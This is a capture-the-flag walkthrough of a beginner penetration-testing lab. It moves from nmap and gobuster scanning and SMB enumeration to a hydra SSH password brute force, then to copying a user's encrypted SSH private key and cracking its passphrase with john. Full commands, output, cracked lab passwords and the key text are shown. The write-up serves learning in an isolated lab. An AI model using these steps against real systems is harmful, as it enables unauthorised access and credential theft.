
# BASIC PENTESTING
### Web App Testing And Privilage Escalation
This room is a perfect place for starting one's career in Pentesting. It shows some of the basic tools and rules, and relies on the basic knowledge of linux and basic Pentesting tools like Nmap, Gobuster etc.
## Tasks
1. Deploy the Machine and connect to our network
2. I have used the attached Lab Machine and the Attackbox directly, instead of connecting through SSH via OpenVPN. Pro tip: Skipping the procees of connection through SSH via OpenVPN saves a lot of time and energy, in terms of downloading tools and wordlists. Since this room uses more than 1 tool and an infamous built-in list containing over 220,000 common folder and file names (like /admin, /login, /uploads, /backup).
3. We find the services exposed by the machine.
   
4. This is where the basics of reconnaisance come into play. I personally use nmap which is default on the Kali 24.04.5 LTS.1 install I have. We start with a basic nmap command <mark>nmap -sV -sC -oN nmap/initial [webappIP]</mark>. This nmap command is commonly used by Ippsec and I have incorporated it into my setup as well. the -sV probes all open ports it finds to determine if we can get the service/version information. The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. And -oN outputs the output of the nmap scan into a normal format so you have it for future use. In here i directed the output to my directory called Nmap and to file called Initial. The results of the given command are as follows:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-19 08:08 UTC
Nmap scan report for ip-10-49-141-174.ap-south-1.compute.internal (10.49.141.174)
Host is up (0.00016s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 82:d4:7e:d8:77:54:ce:2e:8e:b5:f4:13:0b:51:a5:9d (RSA)
|   256 41:06:ad:b0:62:cc:86:b8:6f:5c:35:85:ba:01:6c:46 (ECDSA)
|_  256 e4:ab:8d:fd:db:c8:52:47:79:41:7b:3a:3e:e2:e9:8d (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-title: Apache Tomcat/9.0.7
|_http-favicon: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-10-19T08:09:08
|_  start_date: N/A

Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds.
```
Through this we can see that there are a total of 5 open ports and some services running on them.

4. What is the name of Hidden Directory on the Web Server?

```
<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>
<!-- Check our dev note section if you need to know what to work on. -->
</html>
```
We can see there is a dev notes section somewhere so lets break out our domain enumeration tool. Gobuster is my go-to enum tool, The command we give is <mark>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://[webappIP]</mark>. And the result is as follows.
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.49.183.213
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 320] [--> http://10.49.183.213/development/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```
5. As we can see in the command that we mentioned <mark>directory-list-2.3-small.txt</mark>, this wordlist brute forced a huge number of 225,000 common folder and file names including (/admin, /login, /uploads, /backup) etc. And the result shows one hidden directory which is <mark>/development</mark>. 
And now when we go to the site by changing the suffix of URL with /development, we see 

<img width="526" height="300" alt="webapp_80_files" src="https://github.com/user-attachments/assets/77441d8f-1120-44fa-938b-9d0e1ecf83f5" />

In dev.txt, 
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
Now we know that we've got two people to watch out, with initials K and J.

And in j.txt we got,
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```

6. Now we are at that stage where we enumerate the given ip by using command <mark>enum4linux -a {web_ip}.</mark> where we can see there a total of 2 messages exchanged using SMB(Server Message Block). we will use <mark>smbclient -a //web_ip/Anonymous -N</mark>. we use the word Anonymous because when scanned with enum4linux the conversation mentions Anonymous.

```
smbclient '//10.49.161.70/Anonymous' -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Apr 19 17:31:20 2018
  ..                                  D        0  Thu Apr 19 17:13:06 2018
  staff.txt                           N      173  Thu Apr 19 17:29:55 2018

		14282840 blocks of size 1024. 6245816 blocks available
smb: \> export staff.txt
export: command not found
smb: \> cat staff.txt
cat: command not found
smb: \> get staff.txt
getting file \staff.txt of size 173 as staff.txt (56.3 KiloBytes/sec) (average 56.3 KiloBytes/sec)
smb: \> exit
```
I found a .txt file and exported it to my home directory. And heres the contents.
```
Announcement to staff:

PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
this is how mistakes happen. (This means you too, Jan!)

-Kay
```
So the J and K are Jan and Kay. Since we have the username now, we will try to brute force and get the password.
Command goes <mark> hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 64 -f "ssh://{web_ip}"</mark>
```
hydra -l jan -P /usr/share/wordlists/rockyou.txt -t 64 -f "ssh://10.49.161.70"
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-10-21 16:51:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344398 login tries (l:1/p:14344398), ~224132 tries per task
[DATA] attacking ssh://10.49.161.70:22/
[STATUS] 477.00 tries/min, 477 tries in 00:01h, 14343946 to do in 501:12h, 39 active
 

[22][ssh] host: 10.49.161.70   login: jan   password: armando
[STATUS] attack finished for 10.49.161.70 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-10-21 16:54:07
```
After trying 14 million possibilites(not neccessarily) we fillany got the password for Jan, which is <mark>armando.</mark>
Now we login in into Jan's account using SSH, ~ssh jan@web_ip.

7. To keep it short from now, you can view the whole process of changing directory to kay, and then performing basic linux operations to get her ssh private key.
```
jan@ip-10-49-161-70:~$ cd ..
jan@ip-10-49-161-70:/home$ ls
jan  kay  ubuntu
jan@ip-10-49-161-70:/home$ cd kay
jan@ip-10-49-161-70:/home/kay$ ls
pass.bak
jan@ip-10-49-161-70:/home/kay$ cat pass.bak
cat: pass.bak: Permission denied
jan@ip-10-49-161-70:/home/kay$ ls -lah
total 48K
drwxr-xr-x 5 kay  kay  4.0K Apr 23  2018 .
drwxr-xr-x 5 root root 4.0K Oct 21 12:34 ..
-rw------- 1 kay  kay   789 Jun 22  2025 .bash_history
-rw-r--r-- 1 kay  kay   220 Apr 17  2018 .bash_logout
-rw-r--r-- 1 kay  kay  3.7K Apr 17  2018 .bashrc
drwx------ 2 kay  kay  4.0K Apr 17  2018 .cache
-rw------- 1 root kay   119 Apr 23  2018 .lesshst
drwxrwxr-x 2 kay  kay  4.0K Apr 23  2018 .nano
-rw------- 1 kay  kay    57 Apr 23  2018 pass.bak
-rw-r--r-- 1 kay  kay   655 Apr 17  2018 .profile
drwxr-xr-x 2 kay  kay  4.0K Apr 23  2018 .ssh
-rw-r--r-- 1 kay  kay     0 Apr 17  2018 .sudo_as_admin_successful
-rw------- 1 root kay   538 Apr 23  2018 .viminfo
jan@ip-10-49-161-70:/home/kay$ cd .ssh
jan@ip-10-49-161-70:/home/kay/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
```
And now, we view the encrypted privat key by command:cat id_rsa
```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,6ABA7DE35CDB65070B92C1F760E2FE75

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
-----END RSA PRIVATE KEY-----
```
8. Now we copy paste this private key in an editor, i used nano editor. And used ssh2john to convert into john readable hash, to try and brute for the password.
```
root@ip-10-49-68-160:~# nano key.tx
root@ip-10-49-68-160:~# ssh2john key.tx > kaykeyhash.txt
```
Now, use command to brute force. <mark>john --wordlist=/usr/share/wordlists/rockyou.txt kaykeyhash.txt.</mark>
```
root@ip-10-49-68-160:~# john -wordlist=/usr/share/wordlists/rockyou.txt kaykeyhash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
beeswax          (key.tx)     
1g 0:00:00:00 DONE (2026-10-21 17:09) 6.250g/s 517100p/s 517100c/s 517100C/s behlat..bball40
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
The required password is **beeswax**
And now we change permissions for the key.tx, by using chmod 600 key.tx

One final step, where we use the final command to get into kay's account. Command: ssh -i key.tx "kay@web_ip"


And boom we're in kay's account, and just view the contents of her file using ls command, and read the final password by cat pass.bak 
```
kay@ip-10-49-161-70:~$ ls
pass.bak
kay@ip-10-49-161-70:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
```

